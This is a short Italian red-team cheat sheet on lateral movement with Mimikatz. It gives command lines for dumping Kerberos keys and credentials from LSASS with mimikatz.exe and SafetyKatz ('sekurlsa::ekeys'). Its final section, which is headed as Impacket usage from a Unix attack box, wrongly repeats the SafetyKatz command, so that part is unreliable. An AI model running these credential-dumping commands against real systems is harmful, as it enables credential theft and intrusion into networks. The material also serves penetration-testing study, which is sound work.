# Lateral Movement - Mimikatz

* Mimikatz puo' essere usato per estrarre credenziali, tickets, replay credentials, e altro
* E' uno dei tool red-team e per questo motivo e' fortemente fingerprinted
* Ci sono diversi tool che implementano le features di mimikatz in modo parziale o in modo totale&#x20;



* Dump delle credenziali usando mimikatz

```powershell
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

* Dump delle credenziali usando SafetyKatz (Minidump of lsass and PELoader per eseguire mimikatz)

```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```

* Da un unix-like attack-box utilizzare la suite di Impacket

```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```
